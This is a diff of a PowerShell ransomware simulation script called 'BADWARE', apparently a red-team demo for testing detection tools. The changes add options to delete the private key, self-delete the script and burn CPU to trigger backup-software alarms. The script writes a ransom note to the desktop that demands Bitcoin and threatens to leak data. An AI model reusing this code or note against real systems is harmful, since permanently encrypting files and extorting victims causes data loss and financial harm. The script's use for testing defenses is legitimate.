@@ -5,7 +5,7 @@ __________    _____  ________     __      __  _____ _____________________
  |    |  _/ /  /_\  \ |    |  \  \   \/\/   /  /_\  \|       _/|    __)_                                                    
  |    |   \/    |    \|    `   \  \        /    |    \    |   \|        \                                                   
  |______  /\____|__  /_______  /   \__/\  /\____|__  /____|_  /_______  /                                                   
-        \/         \/        \/         \/         \/       \/        \/  v2.x                                                  
+        \/         \/        \/         \/         \/       \/        \/  v3.x                                                  
 ___.                ____.     .__  .__                   _____                                           __                 
 \_ |__ ___.__.     |    |__ __|  | |__| ____   ____     /     \   ____  __ __  ______________ __   _____/  |_  ____   ____  
  | __ <   |  |     |    |  |  \  | |  |/ __ \ /    \   /  \ /  \ /  _ \|  |  \/  ___/ ____/  |  \_/ __ \   __\/  _ \ /    \ 
@@ -35,16 +35,22 @@ ___.                ____.     .__  .__                   _____                  
 #---------------------------------------------------------[Initialisations]--------------------------------------------------------
 
 # Directory Target to crypt 
-$TargetEncr = "C:\Users\JMOUSQU\OneDrive - COMPUTACENTER\Badware"
+$TargetEncr = "C:\Data"
+
+# At the end load CPU to triggered some behavior alarm 
+$CPULoad = $false
+
+# Delete the script ransomware.ps1 
+$SelfDestroy = $false
+
+# Delete private key after 
+$DeleteKey = $true 
+
+# UI  
+$delay = 60  # Delay to show the UI 
 
 # Define the DN of the certificate 
 $CertName = "DEMO RANSOMWARE"
-
-$CPULoad = $false
-
-# UI  
-$btc_addr = '538f15c2-07ed-4cbe-8f37-efd0ecce1165' # Who knows perhaps I'll get rich 💰 
-$delay = 60  # Delay to show the UI 
 
 #Set Error & Warning Action 
 $ErrorActionPreference = "Stop"
@@ -60,21 +66,26 @@ write-host "__________    _____  ________     __      __  _____ ________________
 write-host "\______   \  /  _  \ \______ \   /  \    /  \/  _  \\______   \_   _____/ " -ForeGroundColor DarkRed
 write-host "|    |  _/ /  /_\  \ |    |  \  \   \/\/   /  /_\  \|       _/|    __)_   " -ForeGroundColor DarkRed
 write-host "|    |   \/    |    \|    `   \  \        /    |    \    |   \|        \  " -ForeGroundColor DarkRed
-write-host "|______  /\____|__  /_______  /   \__/\  /\____|__  /____|_  /______JM /  " -ForeGroundColor DarkRed
+write-host "|______  /\____|__  /_______  /   \__/\  /\____|__  /____|_  /______   /  " -ForeGroundColor DarkRed
 write-host "       \/         \/        \/         \/         \/       \/        \/  $Version" -ForeGroundColor DarkRed
+write-host "___.               ____.     .__  .__                   _____                                           __                 " -ForeGroundColor DarkBlue
+write-host "\_ |__ ___.__.    |    |__ __|  | |__| ____   ____     /     \   ____  __ __  ______________ __   _____/  |_  ____   ____  " -ForeGroundColor DarkBlue
+write-host "| __ <   |  |     |    |  |  \  | |  |/ __ \ /    \   /  \ /  \ /  _ \|  |  \/  ___/ ____/  |  \_/ __ \   __\/  _ \ /    \ " -ForeGroundColor DarkBlue
+write-host "| \_\ \___  | /\__|    |  |  /  |_|  \  ___/|   |  \ /    Y    (  <_> )  |  /\___ < <_|  |  |  /\  ___/|  | (  <_> )   |  \" -ForeGroundColor DarkBlue
+write-host "|___  / ____| \________|____/|____/__|\___  >___|  / \____|__  /\____/|____//____  >__   |____/  \___  >__|  \____/|___|  /" -ForeGroundColor DarkBlue
+write-host "    \/\/                                  \/     \/          \/                  \/   |__|           \/                 \/ " -ForeGroundColor DarkBlue
 
 ### MAIN ### 
 
 if (Test-Path -Path $TargetEncr) {
-	write-host "[+] Let the carnage begin !!! " -ForegroundColor Green
+	write-host "[+] Let the carnage begin on $TargetEncr !!! " -ForegroundColor Green
 } 
 else {
-	write-host "[!] No data found ... exiting " -ForegroundColor Red 
+	write-host "[!] No data found in $TargetEncr... exiting " -ForegroundColor Red 
 	exit
 }
 
 ### CPU BURNER FUNCTION FOR TRIGGERING RANSOMWARE SUSPISION ALARM ###
-
 Function cpuLoad ([int]$delay,[int]$UtilizeCorePercent)
 {
     $cpuCount = (Get-CimInstance -ClassName Win32_processor).NumberOfLogicalProcessors 
@@ -366,17 +377,28 @@ start-sleep 1
 $delay -= 1	  
 }
 $Form.Close()
-Write-Host "[+] Creating Badware.txt on Desktop ..." -ForegroundColor Green
-"We have encrypted your important files. For now, you cannot access these files. `nEncrypted files have been modified with an extension 'badware'. `nIt is possible to recover your files but you need to follow our instructions and pay us before the time runs out. `nIf you do not pay the ransom of 0.10 BTC these files will be leaked online. `nThe faster you contact us at mechant@evildomain with the proof of payment, the easier it will be for us to release your files. `nYour backups were also encrypted and removed. This ransomware encrypts all the files of the hard drive. `nTo decrypt the files please send us the proof of the transfer. Do not try to modify the files extension or else it will destroy the data. `nIf you do not pay the money your sensitive data will be leaked online. `n `n The Red Team ! " | Out-File -FilePath /users/$env:USERNAME/desktop/BadWare.txt
 
-Write-Host "[+] Clean up the mess ..." -ForegroundColor Green
-Remove-Item -Path $MyInvocation.MyCommand.Source
+if (Test-Path $DirectoryPath -PathType Container) {
+    Write-Host "[+] Creating Badware.txt on Desktop ..." -ForegroundColor Green
+    "We have encrypted your important files. For now, you cannot access these files. `nEncrypted files have been modified with an extension 'badware'. `nIt is possible to recover your files but you need to follow our instructions and pay us before the time runs out. `nIf you do not pay the ransom of 0.10 BTC these files will be leaked online. `nThe faster you contact us at mechant@evildomain with the proof of payment, the easier it will be for us to release your files. `nYour backups were also encrypted and removed. This ransomware encrypts all the files of the hard drive. `nTo decrypt the files please send us the proof of the transfer. Do not try to modify the files extension or else it will destroy the data. `nIf you do not pay the money your sensitive data will be leaked online. `n `n The Red Team ! " | Out-File -FilePath /users/$env:USERNAME/desktop/BadWare.txt
+}
 
-Write-Host "[+] Exiting and waiting for the money" -ForegroundColor Green
 
 # BURN CPU FOR 300 SECONDES TO TRIGGER VEEAM ONE RANSOMWARE ALARM :) 
-
-if ($CPULoad -eq $true)
+if ($CPULoad)
     {
         cpuLoad -delay 300 -UtilizeCorePercent 90
     }
+
+# Vérifier si la variable $DeleteKey est vraie
+if ($DeleteKey) {
+    # Supprimer le répertoire $TempDir
+    Remove-Item $TempDir -Recurse -Force
+}
+
+if ($SelfDestroy) { 
+    Write-Host "[+] Clean up the mess ..." -ForegroundColor Green
+    Remove-Item -Path $MyInvocation.MyCommand.Source
+}
+
+Write-Host "[+] Exiting and waiting for the money" -ForegroundColor Green
